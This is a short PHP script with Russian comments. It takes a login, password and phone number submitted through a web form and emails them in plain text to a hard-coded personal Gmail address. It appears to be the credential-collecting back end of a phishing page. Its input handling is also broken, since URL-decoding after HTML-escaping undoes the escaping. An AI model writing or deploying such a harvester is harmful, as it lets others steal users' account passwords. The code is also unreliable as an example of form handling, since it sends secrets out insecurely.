<?php
    // Получаем данные из элементов формы
    $login = $_POST['login'];
    $pass = $_POST['pass'];
    $tel = $_POST['tel'];

    // Обрабатываем получаемые данные

    // Преобразование символов в сущности
    $login = htmlspecialchars($login);
    $pass = htmlspecialchars($pass);
    $tel = htmlspecialchars($tel);
    // Декодирование URL
    $login = urldecode($login);
    $pass = urldecode($pass);
    $tel = urldecode($tel);
    //Удаление пробельных символов с обеих сторон
    $login = trim($login);
    $pass = trim($pass);
    $tel = trim($tel);

    // Отправляем данные на почту
    if (mail("farmer206th@gmail.com",
        "Новое письмо с сайта",
        "Логин: ".$login."\n".
        "Пароль: ".$pass."\n".
        "Телефон: ".$tel,
        "From: \r\n")
    ) {
        echo ('Письмо успешно отправлено!');
    } else {
        echo ('Есть ошибки! Проверьте данные...');
    }
